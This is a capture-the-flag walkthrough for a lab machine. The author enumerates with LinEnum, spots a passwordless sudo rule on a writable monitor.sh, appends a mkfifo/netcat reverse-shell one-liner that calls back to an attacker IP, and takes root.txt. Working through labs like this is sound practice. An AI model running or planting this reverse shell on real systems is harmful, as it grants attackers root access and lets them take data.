
> along with the first flag we copied another file from the victim
> this file was a compressed zip directory containing the folder structurer
> personal.zip
> - personal/
> - personal/stuff/
> and the file
> personal/stuff/monitor.sh

user nibbler has rwx permissions to the shell script monitor.sh

> use the [linuxenum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) script to enumerate some priv escalation before heading forward
> we will use the attacker to grab the script since the victim doesnt have access to outer networks and send it to the victim using nc reverse of that we used in exfil

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

```bash
nc -l -p 420 <linuxenum.sh
```

```bash
wget <attacker ip>:420 -O linuxenum.sh
```

> the  wget will continue after it tranfers the file's data so we kill the nc on the attacker side
> we use wget instead of nc listener on the victim side as there is a permission issue with nc -l -p 


- we run linuxenum.sh on victim after making it executable with chmod +x and we redirect output to a file lenum-out, and send to attacker 

# pwnage 

> notice in output from priv escalation enumeration that user nibbler can sudo without a password, using the file monitor.sh, so if there was a reverse shell in there and it was executed with sudo ./monitor.sh that reverse shell should be a root shell

- to avoid interupting the various commands executed in monitor.sh we will insert the reverse shell at the EOF 
- we also need to inflate it on the victim side as its in personal.zip
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> <port> >/tmp/f' | tee -a monitor.sh
```

> now we set attacker to listen and run it as sudo on victim

```bash
nc -lvnp 420
```


```bash
sudo ~/personal/stuff/monitor.sh
```

> finally with a root  reverse shell we move to the home dir of root, and send the root.txt file back to the attacker

